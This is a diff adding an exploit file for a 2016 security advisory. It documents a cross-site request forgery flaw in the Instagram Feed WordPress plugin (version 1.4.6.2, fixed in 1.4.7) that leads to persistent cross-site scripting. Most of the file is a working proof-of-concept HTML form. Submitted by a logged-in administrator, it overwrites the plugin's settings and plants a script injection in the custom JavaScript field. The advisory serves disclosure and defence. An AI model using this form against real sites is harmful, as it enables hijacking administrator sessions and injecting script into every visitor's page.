@@ -1,0 +1,71 @@
+<!--
+Source: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_instagram_feed_plugin_via_csrf.html
+
+Persistent Cross-Site Scripting in Instagram Feed plugin via CSRF
+Abstract
+A persistent Cross-Site Scripting vulnerability was found in the Instagram Feed plugin. This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a URL provided by an attacker.
+
+Contact
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+OVE-20160724-0014
+
+Tested versions
+This issue was successfully tested on the Instagram Feed WordPress Plugin version 1.4.6.2.
+
+Fix
+This issue is resolved in Instagram Feed WordPress Plugin version 1.4.7.
+
+Introduction
+Instagram Feed is a WordPress plugin to display beautifully clean, customizable, and responsive feeds from multiple Instagram accounts. A persistent Cross-Site Scripting vulnerability was found in the Instagram Feed plugin. This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a URL provided by an attacker.
+
+Details
+The settings page of the Instagram Feed plugin does not perform CSRF checks. It's possible to change all settings in the plugin by making an authenticated administrator perform a request to change the settings (CSRF). It's possible to change the Instagram access token and id to show images of other users. It's also possible to inject malicious JavaScript in the Customize section, to perform Persistent Cross-Site Scripting. Any user visiting the Instagram Feed will be injected with the attackers payload after the CSRF attack.
+
+Proof of Concept
+Have an authenticated admin visit a webpage with the following form:
+-->
+
+<html>
+<body>
+<form action="http://<wordpress site>/wp-admin/admin.php?page=sb-instagram-feed&tab=customize" method="POST">
+<input type="hidden" name="sb&#95;instagram&#95;settings&#95;hidden&#95;field" value="Y" />
+<input type="hidden" name="sb&#95;instagram&#95;customize&#95;hidden&#95;field" value="Y" />
+<input type="hidden" name="sb&#95;instagram&#95;width" value="100" />
+<input type="hidden" name="sb&#95;instagram&#95;width&#95;unit" value="&#37;" />
+<input type="hidden" name="sb&#95;instagram&#95;height" value="100" />
+<input type="hidden" name="sb&#95;instagram&#95;height&#95;unit" value="&#37;" />
+<input type="hidden" name="sb&#95;instagram&#95;background" value="&#35;474747" />
+<input type="hidden" name="sb&#95;instagram&#95;sort" value="none" />
+<input type="hidden" name="sb&#95;instagram&#95;num" value="20" />
+<input type="hidden" name="sb&#95;instagram&#95;cols" value="4" />
+<input type="hidden" name="sb&#95;instagram&#95;image&#95;res" value="auto" />
+<input type="hidden" name="sb&#95;instagram&#95;image&#95;padding" value="5" />
+<input type="hidden" name="sb&#95;instagram&#95;image&#95;padding&#95;unit" value="px" />
+<input type="hidden" name="sb&#95;instagram&#95;show&#95;header" value="on" />
+<input type="hidden" name="sb&#95;instagram&#95;header&#95;color" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;show&#95;btn" value="on" />
+<input type="hidden" name="sb&#95;instagram&#95;btn&#95;background" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;btn&#95;text&#95;color" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;btn&#95;text" value="Load&#32;More&#46;&#46;&#46;" />
+<input type="hidden" name="sb&#95;instagram&#95;show&#95;follow&#95;btn" value="on" />
+<input type="hidden" name="sb&#95;instagram&#95;folow&#95;btn&#95;background" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;follow&#95;btn&#95;text&#95;color" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;follow&#95;btn&#95;text" value="Follow&#32;on&#32;Instagram" />
+<input type="hidden" name="sb&#95;instagram&#95;exclude&#95;words" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;include&#95;words" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;hide&#95;photos" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;block&#95;users" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;custom&#95;css" value="" />
+<input type="hidden" name="sb&#95;instagram&#95;custom&#95;js" value="&#125;&#13;&#10;&#125;&#41;&#59;<&#47;script><script>alert&#40;1&#41;&#59;<&#47;script>&#13;&#10;" />
+<input type="hidden" name="submit" value="Save&#32;Changes" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
+
+<!-- The Custom JavaScript section will now be saved with the attacker's JavaScript payload. -->
